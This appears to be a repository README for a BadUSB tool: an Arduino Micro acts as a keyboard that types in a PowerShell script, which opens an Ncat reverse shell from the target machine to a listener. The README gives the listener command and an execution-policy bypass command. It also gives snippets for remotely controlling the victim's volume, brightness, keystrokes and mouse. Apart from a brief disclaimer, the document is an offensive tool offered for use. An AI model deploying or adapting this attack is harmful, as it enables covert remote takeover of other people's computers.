# Arduino Micro BadUSB
Arduino Micro BadUSB is a repository containing all the files and scripts necessary to run a HID (Human Interface Device) attack using an Arduino Micro or other similar microcontrollers. The client will be able to gain access to the target machine through a reverse shell using Ncat.

## Usage
Once the script in `deploy.ps1` has been entered via USB connection or manual input, the program will automatically set itself up.

The program will start attempting to connect to port 8888, 6969, 6699, 6996, 9669 when it has finished setting up.

The listener machine will have to execute the following command in powershell in order to allow the target machine to connect:
```powershell
.\ncat.exe -l [port_num]
```
Once connected, run the following command to allow script execution and run init.ps1
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; cd..; .\init.ps1
```
## Shortcuts
This program can allow the listener to execute basic powershell commands on target machine, but also has a few extra features:

 - Volume control
 - Brightness control
 - Sending keystrokes
 - Mouse control

**Volume Control**
```bash
[audio]::Volume = 0.5 # 0.5 = 50%, etc.
[audio]::Mute = $true  # Set to $false to un-mute
```

**Brightness Control**
```powershell
Invoke-CimMethod -InputObject (Get-CimInstance -Namespace root/wmi -ClassName WmiMonitorBrightnessMethods) -MethodName WmiSetBrightness -Arguments @{Brightness = 50; Timeout = 1} # 50 = 50%, etc.
```

**Sending Keystrokes**
```powershell
$wshell = New-Object -ComObject wscript.shell # run this first
$wshell.SendKeys('some text')
$wshell.SendKeys('{ENTER}') # presses the ENTER key
$wshell.SendKeys('%{TAB}') # alt + TAB
$wshell.SendKeys('{e 21}') # presses e 21 times
```
See full list at [SendKeys Class (System.Windows.Forms)](https://learn.microsoft.com/en-us/dotnet/api/system.windows.forms.sendkeys)

**Mouse Control**
```powershell
# relative movement
$p1 = [System.Windows.Forms.Cursor]::Position.X + 100
$p2 = [System.Windows.Forms.Cursor]::Position.Y + 100

# absolute movement
$p1 = 1000
$p2 = 20

[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($p1, $p2)
```



## Disclaimer
This repository and the files contained within it should be used on devices for educational purposes only with the owner's permission.

I do not take any responsibility for any loss of data, breach of privacy, or harm caused by the use this program. Use at your own risk.

